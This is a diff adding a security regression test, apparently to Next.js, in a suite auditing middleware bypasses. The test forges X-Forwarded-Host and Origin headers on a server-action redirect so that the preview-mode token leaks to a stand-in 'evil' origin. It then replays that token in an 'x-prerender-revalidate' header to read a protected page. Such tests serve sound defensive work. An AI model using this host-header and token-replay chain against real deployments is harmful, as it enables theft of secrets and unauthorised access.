@@ -484,7 +484,10 @@ describe('audit-middleware-bypass', () => {
   }
 
   async function captureActionRequest(
-    buttonId: 'trigger-action' | 'trigger-redirect-action' = 'trigger-action'
+    buttonId:
+      | 'trigger-action'
+      | 'trigger-redirect-action'
+      | 'trigger-revalidating-redirect-action' = 'trigger-action'
   ): Promise<CapturedActionRequest> {
     let capturedActionRequest: CapturedActionRequest | undefined
 
@@ -861,4 +864,50 @@ describe('audit-middleware-bypass', () => {
       evilRequestHeaders.some((headers) => headers.cookie?.includes('auth=1'))
     ).toBe(true)
   })
+
+  if (isNextStart) {
+    it('leaks the preview token from a revalidating redirect action to the forged host', async () => {
+      const redirectActionRequest = await captureActionRequest(
+        'trigger-revalidating-redirect-action'
+      )
+      const nextHost = new URL(next.url).host
+      const evilHost = new URL(evilOrigin).host
+      const prerenderManifest = await next.readJSON(
+        '.next/prerender-manifest.json'
+      )
+      const previewModeId = prerenderManifest.preview.previewModeId as string
+
+      await next.fetch('/api/clear-private-origin')
+
+      evilRequests.length = 0
+      evilRequestHeaders.length = 0
+
+      const res = await issueRequestWithHostHeader({
+        hostHeader: nextHost,
+        forwardedHostHeader: evilHost,
+        originHostHeader: evilHost,
+        actionRequest: redirectActionRequest,
+      })
+
+      expect(res.statusCode).toBeGreaterThanOrEqual(300)
+      expect(evilRequests).toContain('/post-action-landing')
+      expect(
+        evilRequestHeaders.some(
+          (headers) =>
+            headers['x-next-revalidate-tag-token'] === previewModeId &&
+            headers['x-next-revalidated-tags']?.includes('/protected')
+        )
+      ).toBe(true)
+
+      const bypassRes = await next.fetch('/protected', {
+        headers: {
+          'x-prerender-revalidate': previewModeId,
+        },
+      })
+      const bypassText = await bypassRes.text()
+
+      expect(bypassRes.status).toBe(200)
+      expect(bypassText).toContain('TOP SECRET PAYLOAD')
+    })
+  }
 })
